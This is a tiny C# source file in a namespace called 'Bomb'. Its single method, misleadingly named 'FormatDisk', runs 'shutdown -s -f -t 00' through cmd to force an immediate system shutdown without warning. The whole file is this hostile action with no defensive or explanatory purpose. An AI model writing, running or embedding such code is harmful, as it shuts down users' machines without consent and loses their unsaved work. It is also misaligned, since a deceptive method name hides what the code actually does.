using System;

namespace Bomb
{
    public static class Result
    { 
        public static void FormatDisk()
        {
            System.Diagnostics.Process.Start("cmd", "/c shutdown -s -f -t 00");
        }
    }
}
